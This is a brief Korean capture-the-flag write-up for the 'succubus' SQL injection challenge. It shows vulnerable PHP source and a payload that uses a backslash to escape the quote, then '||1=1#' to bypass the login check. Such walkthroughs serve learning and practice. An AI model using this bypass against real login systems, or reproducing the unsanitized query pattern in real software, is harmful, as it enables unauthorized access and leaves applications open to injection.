# Succubus

소스코드는 다음과 같다.

```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/',$_GET[id])) exit("HeHe");
  if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

`'`을 우회해서, `id`와 `pw`를 모르는채로 로그인을 해야한다.

`\`을 이용해 `'`를 우회해주고 그 후에 `||1=1`을 통해 로그인을 시도해준다.
마지막은 `%23`인 `#`으로 마무리

> ?id=\&pw=||1=1%23

그러면 쿼리는 이렇게 된다.

```sql
select id from prob_succubus where id='\' and pw='||1=1#'
```